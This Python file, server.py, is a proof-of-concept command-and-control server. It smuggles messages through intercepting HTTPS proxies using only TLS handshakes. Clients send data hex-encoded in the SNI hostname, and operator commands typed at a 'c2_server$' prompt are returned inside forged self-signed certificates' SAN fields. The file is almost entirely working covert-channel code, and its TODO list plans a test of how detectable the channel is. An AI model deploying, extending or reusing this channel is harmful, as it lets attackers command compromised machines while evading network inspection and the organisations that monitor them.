# -*- coding: utf-8 -*-

"""
server.py

PoC To Smuggle Messages through an intercepting HTTPS proxy using only the TLS Handshake.

Client Max Bytes Per TLS Client Hello: 284 / 2 ( /2 because of encoding)
Server Max Bytes Per TLS Server Hello: 16k - TLS overhead [~15k] / 2 ( /2 because of encoding)
Server Max Length of SAN record: 

TODO:
    1. Implement Reliable Packetization Protocol
    DONE  - 2. Implment server.py (using x509 SAN fields for smuggling)
    3. Test and investigate how detectable this is as a C2 channel
 
"""

# cryptography imports - warning: compiled C libs lurk here
import threading

from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

from tlslite.x509certchain import X509, X509CertChain
from tlslite.utils.keyfactory import parsePEMKey
from tlslite.extensions import SNIExtension
from tlslite.errors import TLSAbruptCloseError

from tlslite.sessioncache import SessionCache

import queue

#
# WARN: Forked Version of tlslite.tlsconnection that allows us to Dynamically create TLS Server Hello Messages on the fly
#
from tlsconnection import TLSConnection

import socketserver

from datetime import datetime, timedelta
import typing
import random
import string
import argparse
import math

import http.server

#
# Globals
#

MAX_SINGLE_MSG_LEN = 255
MAX_TOTAL_MSG_LEN = MAX_SINGLE_MSG_LEN * 62


# This Mixin is not that exciting since... ALL we are doing is handshaking TLS
class TLSSocketServerMixIn:
    def finish_request(self, sock, *args):
        tlslite_connector = TLSConnection(sock, C2Server.callback)
        if self.handshake(tlslite_connector) == True:
            tlslite_connector.close()


#
# Our C2 Server Class
#
class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.HTTPServer):
    """Our TLS Server... with a few MixIns"""
    data = dict()
    cmd_queue = queue.Queue()

    def insert_partial(self, client_id: bytes, data: str):
        previous = self.data.get(client_id)
        if previous:
            self.data[client_id] += [data]
        else:
            self.data[client_id] = [data]

    def delete_old_client_id(self, client_id: bytes) -> str:
        try:
            value = "".join(self.data[client_id])
            del self.data[client_id]
        except KeyError:
            value = ""
        return value

    def callback(self, sni_object: SNIExtension, client_random: bytearray) -> X509CertChain:
        """The tlslite.tlsconnection module calls this function before responding with a ServerHello"""
        sni = ""
        size = int(client_random[:8], 16)
        current = int(client_random[-8:], 16)
        client_id = bytes(client_random[8:-8])

        send_hello = False
        try:
            sni = sni_object.hostNames[0].decode()
        except:
            send_hello = True
        if sni:
            payload = self.decode_msg(sni)
        else:
            payload = ""
            send_hello = True

        if send_hello:
            response_msg = "Hello"
            self.KEYSTORE.public.x509 = self.create_message(response_msg.encode(), encode=True)
            self.KEYSTORE.public.pem = self.KEYSTORE.public.x509.public_bytes(
                encoding=serialization.Encoding.PEM).decode()
            tlslite_cert = X509()
            self.KEYSTORE.public.tlslite = tlslite_cert.parse(self.KEYSTORE.public.pem)
            return X509CertChain([self.KEYSTORE.public.tlslite])

        if payload.lower() == "hello":
            if not self.cmd_queue.empty():
                response_msg = self.cmd_queue.get(block=False)
                self.KEYSTORE.public.x509 = self.create_message(response_msg.encode(), encode=True)
                self.KEYSTORE.public.pem = self.KEYSTORE.public.x509.public_bytes(
                    encoding=serialization.Encoding.PEM).decode()
                tlslite_cert = X509()
                self.KEYSTORE.public.tlslite = tlslite_cert.parse(self.KEYSTORE.public.pem)
                return X509CertChain([self.KEYSTORE.public.tlslite])
        if size != current:
            self.insert_partial(client_id, payload)
        else:
            value = self.delete_old_client_id(client_id)
            value += payload
            print(value)
        response_msg = "OK"
        self.KEYSTORE.public.x509 = self.create_message(response_msg.encode(), encode=True)
        self.KEYSTORE.public.pem = self.KEYSTORE.public.x509.public_bytes(
            encoding=serialization.Encoding.PEM).decode()
        tlslite_cert = X509()
        self.KEYSTORE.public.tlslite = tlslite_cert.parse(self.KEYSTORE.public.pem)
        return X509CertChain([self.KEYSTORE.public.tlslite])

    KEYSTORE = type(
        "keystore",
        (object,),
        dict(
            private=type("keystore", (object,), dict(x509=None, pem=None, tlslite=None)),
            public=type("keystore", (object,), dict(x509=None, pem=None, tlslite=None)),
            _default_pub=type("keystore", (object,), dict(x509=None, pem=None, tlslite=None)),
        ),
    )
    session_cache = None

    def init(self):
        """Its just easier to name this as such and call explicitly,
        rather than having to fight the mixins dunder inits.. wouldn't you agree?"""
        self.session_cache = SessionCache()
        self.KEYSTORE.private.x509 = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend(),
        )
        self.KEYSTORE.private.pem = self.KEYSTORE.private.x509.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption(),
        ).decode()
        self.KEYSTORE.private.tlslite = parsePEMKey(
            self.KEYSTORE.private.pem,
            private=True,
        )
        tlslite_cert = X509()
        self.KEYSTORE._default_pub.x509 = self.create_default_cert("localhost")
        self.KEYSTORE._default_pub.pem = self.KEYSTORE._default_pub.x509.public_bytes(
            encoding=serialization.Encoding.PEM
        ).decode()
        self.KEYSTORE._default_pub.tlslite = tlslite_cert.parse(self.KEYSTORE._default_pub.pem)
        self.KEYSTORE.public.x509 = self.KEYSTORE._default_pub.x509
        self.KEYSTORE.public.pem = self.KEYSTORE._default_pub.pem
        self.KEYSTORE.public.tlslite = self.KEYSTORE._default_pub.tlslite
        # super.__init__(self, *args)

    def handshake(self, tlslite_connector):
        try:
            tlslite_connector.handshakeServer(
                certChain=X509CertChain([self.KEYSTORE._default_pub.tlslite]),
                privateKey=self.KEYSTORE.private.tlslite,
                sessionCache=self.session_cache,
            )
            tlslite_connector.ignoreAbruptClose = True
            return True
        except TLSAbruptCloseError:
            pass
        except Exception as e:
            raise e

    def create_message(self, message: bytes, encode=True) -> x509.Certificate:
        # Based on: https://gist.github.com/bloodearnest/9017111a313777b9cce5
        sni_msg_str = message.decode()
        if encode:
            host, domain, tld = self._get_random_hostname()
            fqdn = domain + "." + tld
            name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, fqdn)])
            sni_msg_str = self._str_to_hex(message.decode()) + "." + fqdn
        else:
            name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, sni_msg_str)])
        if len(sni_msg_str) > MAX_SINGLE_MSG_LEN:
            print(
                f"ERROR: Encoded message length of {len(sni_msg_str)} (original length was {len(message)}) exceeds MAX_LEN of {MAX_SINGLE_MSG_LEN}"
            )
            raise NotImplementedError
        # Our smuggled payload goes into the SAN
        san = x509.SubjectAlternativeName([x509.DNSName(sni_msg_str)])
        # Now ready to create the crafter Certificate...
        basic_constraints = x509.BasicConstraints(ca=True, path_length=0)
        create_ts = datetime.utcnow() - timedelta(seconds=random.randint(86400, 2592000))
        cert = (
            x509.CertificateBuilder()
            .subject_name(name)
            .issuer_name(name)
            .public_key(self.KEYSTORE.private.x509.public_key())
            .serial_number(1000)
            .not_valid_before(create_ts)
            .not_valid_after(datetime.utcnow() + timedelta(days=random.randint(1, 30)))
            .add_extension(basic_constraints, False)
            .add_extension(san, False)
            .sign(self.KEYSTORE.private.x509, hashes.SHA256(), default_backend())
        )
        # cert_pem = cert.public_bytes(encoding=serialization.Encoding.PEM)
        self.current_cert = cert
        return cert

    @staticmethod
    def _get_random_seed() -> bytes:
        return bytes([random.randrange(0, 256) for _ in range(0, 32)])

    def create_default_cert(self, cn: str) -> x509.Certificate:
        if not cn:
            cn = ".".join(self._get_random_hostname())
        create_ts = datetime.utcnow() - timedelta(seconds=random.randint(86400, 2592000))
        cert = (
            x509.CertificateBuilder()
            .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)]))
            .issuer_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)]))
            .public_key(self.KEYSTORE.private.x509.public_key())
            .serial_number(1000)
            .not_valid_before(create_ts)
            .not_valid_after(datetime.utcnow() + timedelta(days=random.randint(1, 30)))
            .add_extension(x509.BasicConstraints(ca=True, path_length=0), False)
            .add_extension(x509.SubjectAlternativeName([x509.DNSName(cn)]), False)
            .sign(self.KEYSTORE.private.x509, hashes.SHA256(), default_backend())
        )
        self.default_cert = cert
        return cert

    @staticmethod
    def _get_random_hostname() -> typing.Tuple[str, str, str]:
        tld = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(2, 4)))
        domain = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(4, 8)))
        host = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(4, 32)))
        return host, domain, tld

    @staticmethod
    def _str_to_hex(message: str) -> str:
        return bytes.hex(message.encode())

    def _get_sni(self, hex_str: str) -> str:
        # 2 + 32 + session_id_len[1 byte] + suites_len[2 bytes]
        # 1 + ciphers_len[2 bytes] {ciphers}
        # comp_len[1 byte] {comps}
        # ext_len[2 bytes]
        # EXT_TYPE[2 bytes]; if type == 00 00 == SNI
        # EXT_LEN[2 bytes]
        # offset = 66 + int()
        #
        hex_array = [hex_str[i : i + 2] for i in range(0, len(hex_str), 2)]  # byte array (well, list but ya know)
        position = 35 + int(hex_array[35], 16)  # fixed tls fields
        position = position + int("".join(hex_array[position : position + 2]), 16) + 2  # ciphers suites
        position = position + int(hex_array[position], 16) + 1  # compression methods
        # extensions_len = int("".join(h[position : position + 2]), 16)
        position = position + 2
        sni = self._find_sni_extension(hex_array[position:])
        return sni

    @staticmethod
    def _find_sni_extension(exts: list) -> str:
        position = 0
        while position < len(exts):
            ext_type = "".join(exts[position : position + 2])
            ext_len = int("".join(exts[position + 2 : position + 4]), 16)
            # print("DEBUG_EXT_len: "+str(ext_len))
            # print("DEBUG_type: "+ext_type)
            if ext_type == "0000":
                position = position + 7
                # print("DEBUG_position: "+str(position))
                sni_len = int("".join(exts[position : position + 2]), 16)
                position = position + 2
                # print("DEBUG_sni_len: "+str(sni_len))
                # print("DEBUG_sni!: "+str(''.join(exts[position:position+sni_len])))
                return bytes.fromhex("".join(exts[position : position + sni_len])).decode()
            else:
                position = position + ext_len + 4
            return ""

    @staticmethod
    def _validate_client_hello(hex_str: str) -> bool:
        # TLS client hello HEADER Ex: "16 0301 00d3 01 000024"
        try:
            if hex_str[0:2] != "16":
                return False
            if hex_str[2:4] != "03":
                return False
            if (int(hex_str[4:6], 16) < 1) or (int(hex_str[4:6], 16) > 4):
                return False
            max_len = int(math.pow(2, 14))
            if (int(hex_str[6:10], 16) < 1) or (int(hex_str[6:10], 16) > max_len):
                return False
            if hex_str[10:12] != "01":
                return False
            if (int(hex_str[12:], 16) < 1) or (int(hex_str[12:], 16) > max_len):
                return False
        except:
            return False
        return True

    @staticmethod
    def decode_msg(msg: str) -> str:
        """Extracts the smuggled SNI message from the Client Hello"""
        # TODO: For the momement, only handles string types, not arbitrary byte payloads - Fix this up
        return bytes.fromhex(msg.split(".")[0]).decode()

# end class C2Server()

if __name__ == "__main__":
    # sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # proxy_send("_HOST_",443)

    # is_connected = proxy_connect
    # send_raw.proxy_connect(socket.socket(socket.AF_INET, socket.SOCK_STREAM),'_HOST_')

    # new shiz
    arg_parse = argparse.ArgumentParser(
        description="Send and Receive messages via TLS Handshakes through an interception proxy"
    )
    arg_parse.add_argument(
        "-p",
        "--port",
        metavar="bind_port",
        required=False,
        help="Bind to Listening TCP Port number",
    )
    args = arg_parse.parse_args()
    port = 8443
    if args.port:
        port = int(args.port)
    server = None
    C2Server = TLSServer(("0.0.0.0", port), None)
    C2Server.init()
    C2Server.allow_reuse_address = True
    C2Server.allow_reuse_port = True
    server_thread = threading.Thread(target=C2Server.serve_forever,daemon=True)
    print(f"[+] Listening on 0.0.0.0:{port}")
    print("Type 'exit' to terminate the process.")
    try:
        server_thread.start()
        while True:
            # get input from console
            cmd = input("c2_server$ ")
            if cmd == "exit":
                break
            if cmd.strip():
                C2Server.cmd_queue.put(cmd.strip())
        raise KeyboardInterrupt
    except KeyboardInterrupt:
        C2Server.shutdown()
        C2Server.server_close()
        server_thread.join()
        print("[+] Exiting.")
        exit(0)
